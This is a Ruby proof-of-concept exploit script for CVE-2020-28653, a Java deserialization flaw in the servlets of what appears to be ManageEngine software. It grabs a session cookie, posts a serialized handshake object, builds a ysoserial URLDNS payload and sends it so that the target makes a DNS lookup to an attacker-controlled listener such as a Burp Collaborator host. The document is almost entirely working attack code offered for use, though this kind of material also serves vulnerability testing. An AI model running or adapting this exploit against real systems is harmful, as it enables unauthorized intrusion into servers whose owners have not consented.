require 'typhoeus'
require 'optparse'


def _make_request(uri, cookie = nil, body = nil)
  Typhoeus::Request.new(
    uri,
    method: :post,
    headers: {
      'Cookie' => cookie,
      'Content-Type' => 'application/octet-stream'
    },
    body: body
  ).run
end

def _generate_payload(path, listener)
  puts '[*] Generating malicious object'
  serialized_payload = `java -jar #{path} URLDNS #{listener}`
  payload_size = [serialized_payload.size].pack('N')
  payload_size + serialized_payload
end

options = {}
option_parser = OptionParser.new do |opts|
  opts.banner = 'Usage: bundle exec ruby CVE-2020-28653.rb [options]'

  opts.on('-t target', 'target to exploit (including scheme) e.g http://localhost:8060') do |t|
    options[:target] = t
  end

  opts.on('-l listener', 'DNS Listener e.g 1766x23ymcldy2ppolrnvxngc7ix6m.burpcollaborator.net') do |l|
    options[:listener] = l
  end

  opts.on('-p /path/to/ysoserial.jar', 'Path to ysoserial.jar') do |p|
    options[:path] = p
  end
end

option_parser.parse!

if [options[:target], options[:listener], options[:path]].any?(nil)
  puts '[-] Missing required arguments.'
  puts option_parser.help
  return
end

target = options[:target]
listener = "http://#{options[:listener]}" # prepend http as required by URLDNS gadget
path = options[:path]

puts '[*] Firing off request to obtain a session cookie.'
r = _make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet")
cookie = r.headers['Set-Cookie']&.scan(/(JSESSIONID=\w+)/)&.flatten&.first

if cookie.nil?
  puts '[-] ERROR retrieving cookie; is the target correct? Aborting.'
  return
end

puts "[+] Obtained the following session cookie: #{cookie}"
puts '[*] Firing off request to set the requesthandler in the session cookie.'
_make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMHandShakeServlet", cookie, File.open('1002.ser', 'rb').read)

payload = _generate_payload(path, listener)
return if payload.unpack1('H*') == '00000000'

puts '[*] Firing off request to invoke the DNS Lookup.'
_make_request("#{target}/servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet", cookie, payload)
puts '[+] Request sent! Check your DNS Listener for any lookups!'
